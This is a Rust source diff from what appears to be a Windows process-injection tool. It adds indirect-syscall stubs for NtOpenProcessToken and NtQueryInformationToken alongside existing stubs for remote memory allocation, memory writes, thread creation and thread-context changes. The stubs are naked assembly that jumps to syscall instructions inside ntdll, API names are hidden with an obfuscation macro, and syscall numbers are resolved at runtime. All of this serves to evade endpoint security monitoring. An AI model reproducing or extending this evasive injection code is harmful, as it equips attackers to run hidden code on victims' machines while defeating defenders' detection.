@@ -2,7 +2,7 @@ use std::arch::naked_asm;
 use std::ffi::c_void;
 
 use ntapi::ntapi_base::CLIENT_ID;
-use winapi::um::winnt::{HANDLE, CONTEXT};
+use winapi::um::winnt::{HANDLE, CONTEXT, TOKEN_INFORMATION_CLASS};
 use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 use obfuse::obfuse;
 use anyhow::anyhow;
@@ -41,9 +41,11 @@ pub enum NtIndex {
     ZwWriteVirtualMemory = 12,
     ZwCreateThreadEx = 13,
     ZwOpenProcess = 14,
+    NtOpenProcessToken = 15,
+    NtQueryInformationToken = 16,
 }
 
-const NT_FUNCTION_COUNT: usize = 15;
+const NT_FUNCTION_COUNT: usize = 17;
 
 
 #[unsafe(naked)]
@@ -116,127 +118,30 @@ pub unsafe extern "win64" fn zw_set_context_thread(thread_handle: HANDLE, contex
 
 }
 
-    // pub fn ZwProtectVirtualMemory(
-    //     ProcessHandle: HANDLE,
-    //     BaseAddress: *mut PVOID,
-    //     RegionSize: PSIZE_T,
-    //     NewProtect: ULONG,
-    //     OldProtect: PULONG,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn nt_open_process_token(process_handle: HANDLE, desired_access: u32, token_handle: *mut HANDLE, ssn: u32, syscall_ret: *mut u8) -> i32
+{
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, r9d",
+        "jmp qword ptr[rsp+40]"
+    )
+}
 
-    // pub fn ZwFlushInstructionCache(
-    //     ProcessHandle: HANDLE,
-    //     BaseAddress: PVOID,
-    //     NumberOfBytesToFlush: ULONG,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
 
-    // pub fn ZwCreateSection(
-    //     SectionHandle: PHANDLE,
-    //     DesiredAccess: ACCESS_MASK,
-    //     ObjectAttributes: POBJECT_ATTRIBUTES,
-    //     MaximumSize: PLARGE_INTEGER,
-    //     SectionPageProtection: ULONG,
-    //     AllocationAttributes: ULONG,
-    //     FileHandle: HANDLE,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn nt_query_information_token(token_handle: HANDLE, token_information_class: TOKEN_INFORMATION_CLASS, token_information: *mut c_void, token_information_lenght: u64, return_lenght: *mut u64, ssn: u32, syscall_ret: *mut u8) -> i32
+{
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, dword ptr[rsp+48]",
+        "jmp qword ptr[rsp+56]"
+    )
+}
 
-    // pub fn ZwMapViewOfSection(
-    //     SectionHandle: HANDLE,
-    //     ProcessHandle: HANDLE,
-    //     BaseAddress: *mut PVOID,
-    //     ZeroBits: SIZE_T,
-    //     CommitSize: SIZE_T,
-    //     SectionOffset: PLARGE_INTEGER,
-    //     ViewSize: PSIZE_T,
-    //     InheritDisposition: SECTION_INHERIT,
-    //     AllocationType: ULONG,
-    //     Protect: ULONG,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
 
-    // pub fn ZwUnmapViewOfSection(
-    //     ProcessHandle: HANDLE,
-    //     BaseAddress: PVOID,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
-
-    // pub fn ZwQuerySystemInformation(
-    //     SystemInformationClass: ULONG,
-    //     SystemInformation: PVOID,
-    //     SystemInformationLength: ULONG,
-    //     ReturnLength: PULONG,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
-
-    // pub fn ZwQueryObject(
-    //     Handle: HANDLE,
-    //     ObjectInformationClass: ULONG,
-    //     ObjectInformation: PVOID,
-    //     ObjectInformationLength: ULONG,
-    //     ReturnLength: PULONG,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
-
-    // pub fn ZwQueryVirtualMemory(
-    //     ProcessHandle: HANDLE,
-    //     BaseAddress: PVOID,
-    //     MemoryInformationClass: MEMORY_INFORMATION_CLASS,
-    //     MemoryInformation: PVOID,
-    //     MemoryInformationLength: SIZE_T,
-    //     ReturnLength: PSIZE_T,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
-
-    // pub fn ZwFreeVirtualMemory(
-    //     ProcessHandle: HANDLE,
-    //     BaseAddress: *mut PVOID,
-    //     RegionSize: PSIZE_T,
-    //     FreeType: ULONG,
-    //     ssn: DWORD,
-    //     syscallret: PBYTE,
-    // ) -> NTSTATUS;
-
-// macro_rules! set_nt_ssn {
-//     ($exports:ident, $func_name:expr, $func_index:expr) => {
-//         unsafe {
-//             let func_addr = $exports.get_function_address($func_name)
-//                 .map_err(|e| anyhow::anyhow!("[ERROR] API {} not found: {}", $func_name, e))? as *mut u8;
-//             // let func_addr: *mut u8 = $exports.get_function_address($func_name).expect("API not found...") as *mut u8;
-
-//             let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);
-
-//             let mut ssn = 0;
-//             let mut syscall_ptr: *mut u8 = std::ptr::null_mut();
-//             for i in 0..bytes.len().saturating_sub(4) {
-//                 if bytes[i] == 0xB8 && ssn == 0 {
-//                     ssn = u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]]);
-//                 }
-//                 if bytes[i] == 0x0f && bytes[i + 1] == 0x05 {
-//                     syscall_ptr = func_addr.add(i) ;
-//                     break;
-//                 }
-//             }
-
-//             if ssn == 0 || syscall_ptr.is_null() {
-//                 return Err(anyhow!("[ERROR] Failed to find ssn or syscall address for {}", $func_name));
-//             }
-
-//             NT_SSN[$func_index as usize] = NtSsn { ssn: ssn , syscall_ret: syscall_ptr };
-
-//         }
-//     };
-// }
 
 macro_rules! set_nt_ssn {
     ($parser:ident, $func_name:expr, $func_index:expr) => {
@@ -278,6 +183,8 @@ pub fn init_nt_api() -> Result<(), anyhow::Error>{
     let obfused_nt_allocate_virtual_memory = obfuse!("NtAllocateVirtualMemory");
     let obfused_nt_write_virtual_memory = obfuse!("NtWriteVirtualMemory");
     let obfused_nt_create_thread_ex = obfuse!("NtCreateThreadEx");
+    let obfused_nt_open_process_token = obfuse!("NtOpenProcessToken");
+    let obfused_nt_query_information_token = obfuse!("NtQueryInformationToken");
 
     let str_nt_open_process = obfused_nt_open_process.as_str();
     let str_nt_allocate_virtual_memory = obfused_nt_allocate_virtual_memory.as_str();
@@ -285,6 +192,8 @@ pub fn init_nt_api() -> Result<(), anyhow::Error>{
     let str_nt_create_thread_ex = obfused_nt_create_thread_ex.as_str();
     let str_zw_get_context_thread = obfused_zw_get_context_thread.as_str();
     let str_zw_set_context_thread = obfused_zw_set_context_thread.as_str();
+    let str_nt_open_process_token = obfused_nt_open_process_token.as_str();
+    let str_nt_query_information_token = obfused_nt_query_information_token.as_str();
 
     let ntdll_ptr: *mut u8 = unsafe { get_module_handle(ntdll_str) };
     let parser =  PeModuleParser::new(ntdll_ptr);
@@ -295,6 +204,8 @@ pub fn init_nt_api() -> Result<(), anyhow::Error>{
     set_nt_ssn!(parser, str_nt_create_thread_ex, NtIndex::ZwCreateThreadEx);
     set_nt_ssn!(parser, str_zw_get_context_thread, NtIndex::ZwGetContextThread);
     set_nt_ssn!(parser, str_zw_set_context_thread, NtIndex::ZwSetContextThread);
+    set_nt_ssn!(parser, str_nt_open_process_token, NtIndex::NtOpenProcessToken);
+    set_nt_ssn!(parser, str_nt_query_information_token, NtIndex::NtQueryInformationToken);
 
     debug_println!("[INFO] NT API initialized successfully.");
     
